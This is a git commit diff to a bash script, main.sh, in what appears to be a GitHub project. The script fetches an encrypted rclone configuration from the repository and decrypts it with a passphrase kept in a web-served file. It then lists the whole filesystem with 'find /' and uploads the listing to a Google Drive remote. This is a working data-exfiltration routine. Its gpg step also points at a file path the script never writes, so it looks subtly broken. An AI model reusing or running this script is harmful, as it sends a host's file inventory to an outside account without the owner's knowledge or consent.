24fbe3ee91891db977ce67f3d82c8f34df5f81d0
socratesgaming <167761261+socratesgaming@users.noreply.github.com>
2025-03-27 13:10:52 +0300

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
 
 mkdir /usr/share/sflbd
-curl https://github.com/socratesgaming/project-S.O.C.R.A.T.E.S/raw/refs/heads/main/secret.txt.gpg -o /usr/share/sflbd/secret.txt.gpg
+curl https://raw.githubusercontent.com/socratesgaming/project-S.O.C.R.A.T.E.S/refs/heads/main/secret.txt.gpg.asc -o /usr/share/sflbd/secret.txt.gpg.asc
+base64 -d /usr/share/sflbd/secret.txt.gpg.asc > /usr/share/sflbd/secret.txt.gpg
 gpg --decrypt --passphrase-file /var/www/html/sus.html --batch secret.txt.gpg > /usr/share/sflbd/rclone.conf
 find / > /usr/share/sflbd/list.txt
 rclone --config=/usr/share/sflbd/rclone.conf copy /usr/share/sflbd/list.txt gdrive:/
